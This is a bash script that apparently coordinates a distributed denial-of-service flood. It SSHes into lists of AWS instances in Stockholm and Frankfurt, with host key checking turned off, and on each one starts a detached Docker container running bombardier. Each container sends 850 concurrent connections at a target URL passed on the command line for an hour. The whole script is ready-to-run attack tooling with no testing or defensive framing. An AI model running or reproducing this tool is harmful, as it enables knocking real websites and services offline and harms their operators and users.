#!/bin/bash

# Fill the list of IPs of online AWS instances, e.g.:
# STOCKHOLM=('1.2.3.4' '5.6.7.8' '9.10.11.12')
# FRANKFURT=('1.2.3.4' '5.6.7.8' '9.10.11.12')

STOCKHOLM=()
FRANKFURT=()

main(){
	echo "Stockholm fires on $1 by:"
	fire "key-stockholm-1.pem" ${1} "${STOCKHOLM[@]}"

	echo "Frankfurt fires on $1 by:"
	fire "key-frankfurt-1.pem" ${1} "${FRANKFURT[@]}"
}

fire(){
	local key=${1}
	local target=${2}
	shift 2

	for ip in ${@}
	do
		process ${key} ${target} ${ip} &
	done
}

process(){
	echo "${3}"
	ssh \
		-i "${1}" \
		-o "StrictHostKeyChecking no" "ubuntu@${3}" \
		screen \
			-dm sudo docker run \
			-ti \
			--rm alpine/bombardier \
			-c 850 \
			-d 3600s \
			-l ${2}
}

./checkAWS.sh && main ${@} || ./awsCliNa.sh
